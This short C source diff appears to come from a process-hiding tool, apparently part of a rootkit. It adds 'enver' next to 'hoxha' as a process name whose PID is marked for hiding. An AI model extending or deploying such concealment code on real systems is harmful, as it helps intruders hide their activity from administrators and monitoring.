@@ -66,7 +66,7 @@ static void init_hide_names(void) {
         if (fgets(name, sizeof(name), f)) {
             name[strcspn(name, "\n")] = 0;
 
-            if (strcmp(name, "hoxha") == 0) {
+            if (strcmp(name, "hoxha") == 0 || strcmp(name, "enver") == 0) {
                 add_hide_pid(pid);
 
                 // Check PPID
